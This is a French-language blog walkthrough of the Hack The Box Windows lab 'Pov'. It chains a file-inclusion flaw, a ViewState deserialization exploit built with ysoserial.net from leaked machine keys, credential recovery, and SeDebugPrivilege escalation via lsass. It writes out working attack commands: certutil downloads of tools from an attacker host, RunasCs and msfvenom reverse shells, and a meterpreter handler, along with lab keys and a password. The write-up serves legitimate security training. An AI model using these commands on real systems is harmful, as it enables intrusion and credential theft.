<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Pov</title>
<meta name=description content="Platforme: Hack The Box Lien: Pov Niveau: Moyen OS: Windows Pov débute par un simple site web. Après l&amp;rsquo;énumération, nous découvrons un sous-domaine menant …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-pov/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Pov"><meta property="og:description" content="Platforme: Hack The Box Lien: Pov Niveau: Moyen OS: Windows Pov débute par un simple site web. Après l&amp;rsquo;énumération, nous découvrons un sous-domaine menant …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Pov/Pov.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Pov/Pov.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Pov"><meta name=twitter:description content="Platforme: Hack The Box Lien: Pov Niveau: Moyen OS: Windows Pov débute par un simple site web. Après l&amp;rsquo;énumération, nous découvrons un sous-domaine menant …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-pov/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-pov/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Pov/Pov.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-pov/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-pov/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Pov</h1><small role=doc-subtitle></small><p class=post-date>5 min read |
<span class=post-date>7 Juin 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Pov>Pov</a></li><li>Niveau: Moyen</li><li>OS: Windows</li></ul><hr><p>Pov débute par un simple site web. Après l&rsquo;énumération, nous découvrons un sous-domaine menant à un site web ASP.NET qui s&rsquo;avère être vulnérable à une faille LFI. En tirant parti de cette vulnérabilité, nous sommes en mesure de lire un fichier critique exposant des informations sensibles que nous utilisons pour exploiter le mécanisme <code>ViewState</code> du site web, ce qui nous donne accès au système cible. Après exploration du système, nous prenons le contrôle d&rsquo;un autre compte en trouvant ses informations d&rsquo;identification. Enfin, en abusant du privilège <code>SeDebugPrivileg</code> nous accédons à un compte administratif.</p><p><strong>Une machine virtuelle Windows avec Defender désactivé sera nécessaire pour reproduire l&rsquo;une des étapes de l&rsquo;article</strong>.</p><p>IP cible - <code>10.10.11.251</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Pov 10.10.11.251
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-04-23 14:41 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.251
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.055s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>999</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>80/tcp open  http    Microsoft IIS httpd 10.0
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style=display:flex><span>|_http-title: pov.htb
</span></span><span style=display:flex><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 23.01 seconds
</span></span></code></pre></div><h2 id=enumération>Enumération</h2><p>Pour faciliter l&rsquo;énumération, nous ajoutons la cible à notre fichier <code>/etc/hosts</code>.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.251 pov.htb&#34; | sudo tee -a /etc/hosts
</code></pre><p>Le scan ne trouve qu&rsquo;un seul port ouvert (80). En visitant <code>http://10.10.11.251/</code>, nous trouvons un site web statique offrant quelques services de sécurité mais aucune piste d&rsquo;exploitation.</p><p><img src=/images/HTB-Pov/pov-website.png alt="Pov website"></p><p>Avec ffuf, nous identifions un sous-domaine.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u http://pov.htb -H &#34;Host: FUZZ.pov.htb&#34; -ic -fs 12330
</code></pre><p><img src=/images/HTB-Pov/subdomain-pov.png alt="Pov subdomain"></p><p><code>http://dev.pov.htb/</code> mène au portfolio d&rsquo;un développeur web compétent avec JS, ASP.NET, et PHP.</p><p><img src=/images/HTB-Pov/portfolio-website.png alt="Pov portfolio website"></p><p>Nous pouvons télécharger son CV à l&rsquo;aide du bouton. Nous observons que le paramètre <code>file</code> est utilisé et qu&rsquo;il fait référence à <code>cv.pdf</code>. Nous pouvons essayer de l&rsquo;utiliser pour un LFI (Local File Inclusion). <em>Pour en savoir plus sur cette vulnérabilité, cliquez <a href=https://www.vaadata.com/blog/fr/exploitation-dune-faille-lfi-local-file-inclusion-et-bonnes-pratiques-securite/>ici</a></em>.</p><p><img src=/images/HTB-Pov/cv-download.png alt="Pov CV download request"></p><p>Sous Windows, le fichier hosts se trouve à l&rsquo;adresse suivante <code>C:\WINDOWS\system32\drivers\etc\hosts</code>.</p><p><img src=/images/HTB-Pov/LFI-hosts-file.png alt="Pov LFI vulnerability"></p><p>Nous arrivons à lire ce fichier! Avec l&rsquo;aide de <code>Wappalyzer</code> nous apprenons que l&rsquo;application est conçue avec ASP.NET et quelques recherches nous apprennent que <code>web.config</code> est le fichier de configuration « utilisé pour gérer les différents paramètres qui définissent un site web » dans les applications ASP.NET. <em>Pour en savoir plus, cliquez <a href=https://www.c-sharpcorner.com/UploadFile/puranindia/Asp-Net-web-configuration-file/>ici</a></em>.</p><p><img src=/images/HTB-Pov/web-framework.png alt="Pov wappalyzer info"></p><p><img src=/images/HTB-Pov/web-config.png alt="ASP.NET Web config file"></p><p>Nous parvenons à lire le fichier de configuration en remplaçant la valeur <code>file</code> par <code>/web.config</code>.</p><p><img src=/images/HTB-Pov/web-config-file.png alt="Web config file read"></p><p>En recherchant <code>asp.net machine key exploitation</code> nous trouvons <a href=https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter>cette</a> page HackTricks expliquant comment utiliser un outil appelé <a href=https://github.com/pwntester/ysoserial.net>ysoserial.net</a> pour exploiter <code>vIewState</code>.</p><p>Sous <code>Testcase 1.5</code> nous lisons que nous devons fournir deux paramètres <code>--apppath=« / »</code> et <code>--path=« /hello.aspx »</code>.</p><p>Nous avons aussi besoin que notre payload soit encodé en base64, ce que nous obtenons sur <a href=https://www.revshells.com/>revshells</a> en utilisant l&rsquo;option <code>PowerShell #3 (Base64)</code>.</p><h2 id=accès-initial>Accès initial</h2><p><code>ysoserial</code> est conçu pour Windows. Nous utilisons une VM Windows avec Defender désactivé parce qu&rsquo;il signale l&rsquo;outil comme malveillant. Après exécution de la commande ci-dessous, nous copions son résultat et nous l&rsquo;utilisons pour le paramètre <code>ViewState</code>.</p><p><strong>Command example</strong></p><pre tabindex=0><code>.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c &#34;&lt;INSERT_REVSHELL_HERE&gt;&#34; --path=&#34;/portfolio/default.aspx&#34; --apppath=&#34;/&#34; --decryptionalg=&#34;AES&#34; --decryptionkey=&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34; --validationalg=&#34;SHA1&#34; --validationkey=&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34;
</code></pre><p><img src=/images/HTB-Pov/ViewState-payload.png alt="ViewState Payload"></p><p>Nous obtenons une connexion sur notre listener après avoir envoyé la requête.</p><p><img src=/images/HTB-Pov/initial-foothold.png alt="Initial Foothold"></p><p>Ce compte ne peut pas accéder au fichier <code>user.txt</code> par contre nous trouvons un fichier appelé <code>connection.xml</code> dans <code>C:\Users\sfitz\Documents</code>. Il contient les informations d&rsquo;identification de l&rsquo;utilisateur <code>alaading</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>&lt;Objs <span style=color:#e06c75>Version</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;1.1.0.1&#34;</span> <span style=color:#e06c75>xmlns</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span>&gt;
</span></span><span style=display:flex><span>  &lt;Obj <span style=color:#e06c75>RefId</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;0&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;TN <span style=color:#e06c75>RefId</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;0&#34;</span>&gt;
</span></span><span style=display:flex><span>      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
</span></span><span style=display:flex><span>      &lt;T&gt;System.Object&lt;/T&gt;
</span></span><span style=display:flex><span>    &lt;/TN&gt;
</span></span><span style=display:flex><span>    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
</span></span><span style=display:flex><span>    &lt;Props&gt;
</span></span><span style=display:flex><span>      &lt;S <span style=color:#e06c75>N</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;UserName&#34;</span>&gt;alaading&lt;/S&gt;
</span></span><span style=display:flex><span>      &lt;SS <span style=color:#e06c75>N</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;Password&#34;</span>&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&lt;/SS&gt;
</span></span><span style=display:flex><span>    &lt;/Props&gt;
</span></span><span style=display:flex><span>  &lt;/Obj&gt;
</span></span><span style=display:flex><span>&lt;/Objs&gt;
</span></span></code></pre></div><p>Nous avons une valeur de mot de passe mais il ne s&rsquo;agit pas d&rsquo;un hash, cette méthode utilise un module Powershell qui s&rsquo;appuie sur XML sécurisé. <em>Pour en savoir plus <a href=https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx>ici</a></em>.</p><p>Nous révélons le mot de passe avec les commandes ci-dessous.</p><pre tabindex=0><code>$cred = Import-CliXml C:\Users\sfitz\Documents\connection.xml

$cred.GetNetworkCredential() | fl
</code></pre><p><img src=/images/HTB-Pov/alaading-creds.png alt="User alaading user"></p><h3 id=mouvement-latéral>Mouvement latéral</h3><p>Avec les identifiants, nous pouvons maintenant utiliser <a href=https://github.com/antonioCoco/RunasCs>RunasCs</a> pour obtenir un shell en tant qu&rsquo;utilisateur <code>alaading</code>.</p><blockquote><p><code>certutil</code> est utilisé pour télécharger l&rsquo;outil sur la cible.</p></blockquote><pre tabindex=0><code>certutil -urlcache -f http://&lt;IP_address&gt;:&lt;PORT&gt;/RunasCs.exe runascs.exe
</code></pre><p><img src=/images/HTB-Pov/dl-runascs.png alt="runascs download"></p><p>Après avoir exécuté la commande ci-dessous, nous obtenons un shell.</p><pre tabindex=0><code>.\runascs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r &lt;IP_address&gt;:&lt;PORT&gt;
</code></pre><p><img src=/images/HTB-Pov/alaading-shell.png alt="alaading shell"></p><p>Nous trouvons <code>user.txt</code> à l&rsquo;adresse <code>C\Users\alaading\desktop\user.txt</code>.</p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Nous avons vu que cet utilisateur dispose du privilège <code>SeDebugPrivilege</code>. Selon <a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege>HackTricks</a>, &ldquo;ce privilège permet de <strong>debugger d&rsquo;autres processus</strong>, y compris de lire et d&rsquo;écrire dans la mémoire. Diverses stratégies d&rsquo;injection de mémoire, capables d&rsquo;échapper à la plupart des antivirus et des solutions de prévention des intrusions, peuvent être employées avec ce privilège&rdquo;.</p><p>Nous commençons par générer un payload avec msfvenom.</p><pre tabindex=0><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=IP_address lport=PORT -f exe -a x64 --platform windows -o revshell.exe
</code></pre><p>Puis nous téléchargeons le fichier sur la cible.</p><pre tabindex=0><code>certutil -urlcache -f http://&lt;IP_address&gt;:&lt;PORT&gt;/revshell.exe revshell.exe
</code></pre><p><img src=/images/HTB-Pov/revshell.png alt="reverse shell file"></p><p>Ensuite, dans Metasploit, nous lançons le <code>mutli/handler</code>, exécutons le fichier <code>revshell.exe</code> sur la cible et nous obtenons une session meterpreter.</p><pre tabindex=0><code>use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost &lt;IP_address&gt;
set lport &lt;PORT&gt;
run
</code></pre><p><img src=/images/HTB-Pov/meterpreter-session.png alt="meterpreter session"></p><p>Avec la commande <code>ps</code> nous examinons les processus sur la cible et nous remarquons <code>lsass.exe</code>. Puisque nous avons le privilège <code>SeDebugPrivilege</code>, nous pouvons migrer vers ce processus.</p><p><img src=/images/HTB-Pov/lsass-process.png alt="lsass process"></p><p><img src=/images/HTB-Pov/process-migration.png alt="process migration"></p><p>Nous utilisons <code>shell</code> pour lancer un shell <code>cmd</code>, nous sommes maintenant <code>nt authoritysystem</code> et <code>root.txt</code> se trouve à <code>C:\NUsers\Administrator\NDesktop\Nroot.txt</code>.</p><p><img src=/images/HTB-Pov/root-flag.png alt="Root flag"></p><p>Une VM Windows est parfois nécessaire pour exécuter certains outils pour les tests de pénétration, je recommande <a href=https://github.com/mandiant/commando-vm>CommandoVM</a> car il est livré avec de nombreux outils qui ne sont pas inclus dans Kali Linux. Vous pouvez suivre <a href="https://www.youtube.com/watch?v=nNMEhm8pvPM&amp;ab_channel=Lsecqt">cette vidéo</a> pour un tutoriel d&rsquo;installation. J&rsquo;espère que cet article vous a été utile !</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-bizness/>&#8592;
Précédent:
HTB: Bizness</a></p><p class=prev-post-date>mai 22, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-crafty/>Suivant:
HTB: Crafty
&#8594;</a></p><p class=next-post-date>juin 12, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès initial</a><ul><li><a href=#mouvement-latéral>Mouvement latéral</a></li></ul></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>